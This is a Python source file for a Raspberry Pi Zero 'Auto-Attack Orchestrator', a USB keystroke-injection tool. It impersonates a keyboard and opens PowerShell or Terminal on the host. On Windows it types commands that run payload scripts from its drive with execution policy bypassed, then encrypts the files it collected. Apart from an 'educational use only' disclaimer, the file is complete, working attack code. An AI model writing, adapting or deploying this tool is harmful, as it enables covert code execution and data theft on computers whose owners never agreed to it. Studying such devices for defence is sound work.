#!/usr/bin/env python3
"""
Auto-Attack Orchestrator — Pi Zero Cybersecurity Tool

This is the "movie-hacker" engine.  When the Pi Zero is plugged into a target
computer it will (via a systemd service calling payload_runner.sh):

    1.  Set-up a composite USB gadget  (HID keyboard + mass storage)
    2.  Detect the target OS
    3.  Open a terminal via HID keystrokes
    4.  Execute the OS-specific payload from the mass-storage drive
    5.  Encrypt the collected results
    6.  Blink an LED to signal "done — unplug me"

This Python module provides a clean API for steps 2–6 so you can also drive
the attack from Python (e.g. over SSH to the Pi while debugging).

Educational Purpose Only — authorized testing on systems you own.

Author: Mr.D137
License: MIT (Educational Use)
"""

from __future__ import annotations

import json
import logging
import os
import struct
import subprocess
import sys
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Dict, List, Optional

# Ensure project modules are importable
_THIS_DIR = Path(__file__).resolve().parent           # src/
_PROJECT_ROOT = _THIS_DIR.parent
for _p in (str(_THIS_DIR), str(_PROJECT_ROOT)):
    if _p not in sys.path:
        sys.path.insert(0, _p)

from tools.encrypt_data import SecureDataHandler

logger = logging.getLogger(__name__)

# ──────────────────────────────────────────────────────────────────────
#  USB HID key codes  (US keyboard layout)
# ──────────────────────────────────────────────────────────────────────

_SHIFT = 0x02  # Left shift modifier
_GUI   = 0x08  # Left GUI (Win / Cmd) modifier

# fmt: off
_CHAR_MAP: Dict[str, tuple[int, int]] = {
    # char: (modifier, key_code)
    'a': (0, 0x04), 'b': (0, 0x05), 'c': (0, 0x06), 'd': (0, 0x07),
    'e': (0, 0x08), 'f': (0, 0x09), 'g': (0, 0x0A), 'h': (0, 0x0B),
    'i': (0, 0x0C), 'j': (0, 0x0D), 'k': (0, 0x0E), 'l': (0, 0x0F),
    'm': (0, 0x10), 'n': (0, 0x11), 'o': (0, 0x12), 'p': (0, 0x13),
    'q': (0, 0x14), 'r': (0, 0x15), 's': (0, 0x16), 't': (0, 0x17),
    'u': (0, 0x18), 'v': (0, 0x19), 'w': (0, 0x1A), 'x': (0, 0x1B),
    'y': (0, 0x1C), 'z': (0, 0x1D),
    'A': (_SHIFT, 0x04), 'B': (_SHIFT, 0x05), 'C': (_SHIFT, 0x06),
    'D': (_SHIFT, 0x07), 'E': (_SHIFT, 0x08), 'F': (_SHIFT, 0x09),
    'G': (_SHIFT, 0x0A), 'H': (_SHIFT, 0x0B), 'I': (_SHIFT, 0x0C),
    'J': (_SHIFT, 0x0D), 'K': (_SHIFT, 0x0E), 'L': (_SHIFT, 0x0F),
    'M': (_SHIFT, 0x10), 'N': (_SHIFT, 0x11), 'O': (_SHIFT, 0x12),
    'P': (_SHIFT, 0x13), 'Q': (_SHIFT, 0x14), 'R': (_SHIFT, 0x15),
    'S': (_SHIFT, 0x16), 'T': (_SHIFT, 0x17), 'U': (_SHIFT, 0x18),
    'V': (_SHIFT, 0x19), 'W': (_SHIFT, 0x1A), 'X': (_SHIFT, 0x1B),
    'Y': (_SHIFT, 0x1C), 'Z': (_SHIFT, 0x1D),
    '1': (0, 0x1E), '2': (0, 0x1F), '3': (0, 0x20), '4': (0, 0x21),
    '5': (0, 0x22), '6': (0, 0x23), '7': (0, 0x24), '8': (0, 0x25),
    '9': (0, 0x26), '0': (0, 0x27),
    ' ': (0, 0x2C), '-': (0, 0x2D), '=': (0, 0x2E), '[': (0, 0x2F),
    ']': (0, 0x30), '\\': (0, 0x31), ';': (0, 0x33), "'": (0, 0x34),
    '`': (0, 0x35), ',': (0, 0x36), '.': (0, 0x37), '/': (0, 0x38),
    '!': (_SHIFT, 0x1E), '@': (_SHIFT, 0x1F), '#': (_SHIFT, 0x20),
    '$': (_SHIFT, 0x21), '%': (_SHIFT, 0x22), '^': (_SHIFT, 0x23),
    '&': (_SHIFT, 0x24), '*': (_SHIFT, 0x25), '(': (_SHIFT, 0x26),
    ')': (_SHIFT, 0x27), '_': (_SHIFT, 0x2D), '+': (_SHIFT, 0x2E),
    '{': (_SHIFT, 0x2F), '}': (_SHIFT, 0x30), '|': (_SHIFT, 0x31),
    ':': (_SHIFT, 0x33), '"': (_SHIFT, 0x34), '~': (_SHIFT, 0x35),
    '<': (_SHIFT, 0x36), '>': (_SHIFT, 0x37), '?': (_SHIFT, 0x38),
    '\n': (0, 0x28), '\t': (0, 0x2B),
}
# fmt: on


# ──────────────────────────────────────────────────────────────────────
#  HID Keyboard driver  (writes 8-byte boot-protocol reports)
# ──────────────────────────────────────────────────────────────────────

class HIDKeyboard:
    """Send keystrokes to the host via /dev/hidg0."""

    REPORT_LEN = 8

    def __init__(self, device: str = "/dev/hidg0"):
        self.device = device

    # ---- low-level ----

    def _write(self, report: bytes) -> None:
        """Write an 8-byte HID report."""
        with open(self.device, "wb") as f:
            f.write(report)

    def _release(self) -> None:
        self._write(b'\x00' * self.REPORT_LEN)

    def press(self, modifier: int = 0, *keys: int) -> None:
        """Press modifier + up to 6 keys then release."""
        report = bytearray(self.REPORT_LEN)
        report[0] = modifier
        for i, k in enumerate(keys[:6]):
            report[2 + i] = k
        self._write(bytes(report))
        time.sleep(0.02)
        self._release()
        time.sleep(0.02)

    # ---- high-level helpers ----

    def type_string(self, text: str, delay: float = 0.02) -> None:
        """Type an arbitrary ASCII string, character by character."""
        for ch in text:
            entry = _CHAR_MAP.get(ch)
            if entry is None:
                logger.warning(f"Unmappable character skipped: {ch!r}")
                continue
            mod, key = entry
            self.press(mod, key)
            time.sleep(delay)

    def enter(self) -> None:
        self.press(0, 0x28)
        time.sleep(0.05)

    def gui(self, key: int = 0) -> None:
        """Press GUI (Win/Cmd) + optional key."""
        self.press(_GUI, key)
        time.sleep(0.3)

    def type_line(self, text: str) -> None:
        """Type text + Enter."""
        self.type_string(text)
        self.enter()

    @property
    def available(self) -> bool:
        return os.path.exists(self.device)


# ──────────────────────────────────────────────────────────────────────
#  GPIO LED
# ──────────────────────────────────────────────────────────────────────

class StatusLED:
    """Control a GPIO LED for visual feedback."""

    def __init__(self, pin: int = 17):
        self.pin = pin
        self.gpio_dir = Path(f"/sys/class/gpio/gpio{pin}")
        self._init()

    def _init(self) -> None:
        try:
            if not self.gpio_dir.exists():
                Path("/sys/class/gpio/export").write_text(str(self.pin))
            (self.gpio_dir / "direction").write_text("out")
        except (PermissionError, OSError):
            pass  # not on Pi hardware

    def on(self) -> None:
        try:
            (self.gpio_dir / "value").write_text("1")
        except (PermissionError, OSError):
            pass

    def off(self) -> None:
        try:
            (self.gpio_dir / "value").write_text("0")
        except (PermissionError, OSError):
            pass

    def blink(self, count: int = 3, interval: float = 0.2) -> None:
        for _ in range(count):
            self.on(); time.sleep(interval)
            self.off(); time.sleep(interval)


# ──────────────────────────────────────────────────────────────────────
#  OS Detection  (based on filesystem artefacts written by the host)
# ──────────────────────────────────────────────────────────────────────

def detect_host_os(mount: str = "/mnt/usb_share") -> str:
    """Detect the host OS by examining files the host writes to the mass-storage."""
    mp = Path(mount)
    if (mp / ".DS_Store").exists() or (mp / ".Spotlight-V100").exists():
        return "macos"
    if (mp / "desktop.ini").exists() or (mp / "System Volume Information").is_dir():
        return "windows"
    return "windows"  # safe default


# ──────────────────────────────────────────────────────────────────────
#  Attack Orchestrator
# ──────────────────────────────────────────────────────────────────────

@dataclass
class AttackConfig:
    """Runtime configuration for an attack session."""
    mount_point: str = "/mnt/usb_share"
    hid_device: str = "/dev/hidg0"
    led_pin: int = 17
    wait_enumerate: float = 6.0
    wait_payload: float = 25.0
    auto_encrypt: bool = True
    auto_cleanup: bool = True


@dataclass
class AttackResult:
    """Outcome of an attack session."""
    host_os: str = "unknown"
    hid_injected: bool = False
    payload_executed: bool = False
    encrypted: bool = False
    errors: List[str] = field(default_factory=list)
    start_time: str = ""
    end_time: str = ""


class AutoAttack:
    """
    Plug-and-play orchestrator.

    Usage on the Pi (typically called by payload_runner.sh at boot)::

        from auto_attack import AutoAttack, AttackConfig
        result = AutoAttack(AttackConfig()).run()
    """

    def __init__(self, config: Optional[AttackConfig] = None):
        self.cfg = config or AttackConfig()
        self.kb = HIDKeyboard(self.cfg.hid_device)
        self.led = StatusLED(self.cfg.led_pin)
        self.result = AttackResult()

    # ---- payload injection per OS ----

    def _inject_windows(self) -> None:
        """Open PowerShell via Win+R and run the payload off the USB drive."""
        self.kb.gui(0x15)           # GUI + R → Run dialog
        time.sleep(0.8)
        self.kb.type_line("powershell")
        time.sleep(1.5)

        cmd = (
            '$d=(Get-Volume|?{$_.FileSystemLabel -match "CYBERSEC|TRUSTED"}).DriveLetter;'
            'if($d){Set-Location "${d}:";'
            'powershell -Ep Bypass -File .\\windows_payload.ps1 -OutputPath "${d}:"}'
            ' else{echo "Drive not found"}'
        )
        self.kb.type_line(cmd)

    def _inject_macos(self) -> None:
        """Open Terminal via Cmd+Space→Spotlight and run the payload."""
        self.kb.gui(0x2C)           # Cmd + Space → Spotlight
        time.sleep(0.8)
        self.kb.type_string("Terminal")
        time.sleep(0.3)
        self.kb.enter()
        time.sleep(1.5)

        cmd = (
            'vol=$(ls -d /Volumes/CYBERSEC* /Volumes/TRUSTED* 2>/dev/null|head -1);'
            'if [ -n "$vol" ];then bash "$vol/macos_payload.sh" -o "$vol";'
            'else echo "Drive not found";fi'
        )
        self.kb.type_line(cmd)

    # ---- encrypt results ----

    def _encrypt(self) -> None:
        """Encrypt all text/json files on the drive into one .enc blob."""
        import glob
        mount = self.cfg.mount_point
        handler = SecureDataHandler(storage_path=mount)
        collected: Dict[str, str] = {}
        for pattern in ("*.txt", "*.json"):
            for fp in glob.glob(os.path.join(mount, "**", pattern), recursive=True):
                try:
                    with open(fp) as f:
                        collected[os.path.relpath(fp, mount)] = f.read()[:50_000]
                except Exception:
                    pass
        if collected:
            handler.store_encrypted_data(collected, "collected_data.enc")
            self.result.encrypted = True
            logger.info(f"Encrypted {len(collected)} file(s) → collected_data.enc")
        else:
            logger.info("Nothing to encrypt")

    # ---- main sequence ----

    def run(self) -> AttackResult:
        """Execute the full attack sequence.  Returns an ``AttackResult``."""
        self.result.start_time = datetime.now(tz=timezone.utc).isoformat()

        # 1. Ethical warning blink
        self.led.blink(3, 0.15)

        # 2. Wait for USB to enumerate
        logger.info("Waiting %.0fs for host enumeration…", self.cfg.wait_enumerate)
        time.sleep(self.cfg.wait_enumerate)

        # 3. Detect OS
        self.result.host_os = detect_host_os(self.cfg.mount_point)
        logger.info("Detected host OS: %s", self.result.host_os)

        # 4. LED solid = attacking
        self.led.on()

        # 5. HID injection
        if self.kb.available:
            try:
                if self.result.host_os == "windows":
                    self._inject_windows()
                elif self.result.host_os == "macos":
                    self._inject_macos()
                else:
                    self.result.errors.append(f"No payload for OS: {self.result.host_os}")
                self.result.hid_injected = True
                self.result.payload_executed = True
            except Exception as exc:
                self.result.errors.append(f"HID injection failed: {exc}")
                logger.error("HID injection error: %s", exc)
        else:
            msg = f"HID device {self.cfg.hid_device} not found"
            self.result.errors.append(msg)
            logger.warning(msg)

        # 6. Wait for payload to finish
        logger.info("Waiting %.0fs for payload…", self.cfg.wait_payload)
        time.sleep(self.cfg.wait_payload)

        # 7. Encrypt
        if self.cfg.auto_encrypt:
            try:
                self._encrypt()
            except Exception as exc:
                self.result.errors.append(f"Encryption failed: {exc}")

        # 8. Cleanup
        if self.cfg.auto_cleanup:
            for tmp in Path(self.cfg.mount_point).rglob("*.tmp"):
                tmp.unlink(missing_ok=True)

        # 9. LED off → 5 rapid blinks = done
        self.led.off()
        self.led.blink(5, 0.1)

        self.result.end_time = datetime.now(tz=timezone.utc).isoformat()
        return self.result


# ──────────────────────────────────────────────────────────────────────
#  CLI
# ──────────────────────────────────────────────────────────────────────

def main() -> int:
    """Run the auto-attack from the command line."""
    import argparse

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
    )

    parser = argparse.ArgumentParser(
        description="Auto-Attack Orchestrator — plug-and-play cybersecurity tool"
    )
    parser.add_argument("--mount", default="/mnt/usb_share", help="Mount point")
    parser.add_argument("--hid", default="/dev/hidg0", help="HID device path")
    parser.add_argument("--wait-enum", type=float, default=6, help="Seconds to wait for enumeration")
    parser.add_argument("--wait-payload", type=float, default=25, help="Seconds to wait for payload")
    parser.add_argument("--no-encrypt", action="store_true", help="Skip encryption step")
    parser.add_argument("--dry-run", action="store_true", help="Print plan without executing")
    args = parser.parse_args()

    cfg = AttackConfig(
        mount_point=args.mount,
        hid_device=args.hid,
        wait_enumerate=args.wait_enum,
        wait_payload=args.wait_payload,
        auto_encrypt=not args.no_encrypt,
    )

    if args.dry_run:
        print("=== DRY RUN ===")
        print(f"  Mount point : {cfg.mount_point}")
        print(f"  HID device  : {cfg.hid_device}")
        print(f"  Wait enum   : {cfg.wait_enumerate}s")
        print(f"  Wait payload: {cfg.wait_payload}s")
        print(f"  Encrypt     : {cfg.auto_encrypt}")
        print(f"  HID present : {HIDKeyboard(cfg.hid_device).available}")
        print(f"  Detected OS : {detect_host_os(cfg.mount_point)}")
        return 0

    attack = AutoAttack(cfg)
    result = attack.run()

    print("\n=== ATTACK RESULT ===")
    print(json.dumps({
        "host_os": result.host_os,
        "hid_injected": result.hid_injected,
        "payload_executed": result.payload_executed,
        "encrypted": result.encrypted,
        "errors": result.errors,
        "start": result.start_time,
        "end": result.end_time,
    }, indent=2))

    return 0 if not result.errors else 1


if __name__ == "__main__":
    sys.exit(main())
